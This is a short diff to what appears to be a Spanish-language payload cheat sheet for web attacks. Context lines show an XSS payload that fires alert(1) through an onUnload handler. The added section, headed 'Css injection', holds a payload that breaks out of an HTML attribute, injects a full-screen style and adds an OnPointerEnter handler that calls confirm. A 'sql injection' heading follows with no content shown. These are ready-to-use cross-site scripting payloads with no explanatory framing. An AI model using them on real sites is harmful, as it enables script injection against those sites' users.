@@ -406,7 +406,12 @@ Muchos mas:
 <body onUnload body onUnload="javascript:javascript:alert(1)">
 ```
 
+# Css injection
 
+```
+1"Style="position:fixed;top:350;left:400;font-size:99999px;"OnPointerEnter="new class extends confirm`_Y000!_`{}"
+
+```
 
 
 # sql injection 
